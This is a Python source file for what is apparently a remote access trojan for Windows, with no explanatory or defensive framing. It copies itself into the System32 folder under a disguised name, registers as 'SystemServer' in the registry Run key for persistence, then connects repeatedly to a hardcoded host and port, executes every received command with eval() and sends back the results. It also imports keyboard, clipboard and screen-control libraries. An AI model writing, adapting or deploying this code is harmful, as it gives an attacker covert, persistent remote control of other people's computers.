import socket


"""Modules for commands"""
import pyautogui
import keyboard
import pyperclip
import shutil
import os
import sys
from tkinter import messagebox
import subprocess
import winreg
import time
import datetime
from win10toast import ToastNotifier

"""registry things"""
filename = f"{os.path.splitext(os.path.basename(__file__))[0]}.exe"   # .exe of the file
hidepath = f"C:\\Windows\\System32\\{filename}"
shutil.copyfile(filename, hidepath)
sys.executable = hidepath
key = winreg.HKEY_CURRENT_USER
runkey = winreg.OpenKeyEx(key, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
winreg.SetValueEx(runkey,"SystemServer", 0, winreg.REG_SZ, hidepath)

host = "192.168.1.75"
port = 6000
def connect(s: socket.socket):
    try:
        s.connect((host, port))
    except:
        connect(s)
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    while True:
        connect(s)
        try:
            while True:
                command = s.recv(2048).decode('utf-8')
                try:
                    data = eval(command)
                    s.send("No error occurred.".encode())
                    time.sleep(1)
                    s.send(("Return: " + str(data)).encode())
                except Exception as e:
                    s.send(("Error: " + str(e)).encode())
                    time.sleep(1)
                    s.send("No return.".encode())
        except:
            pass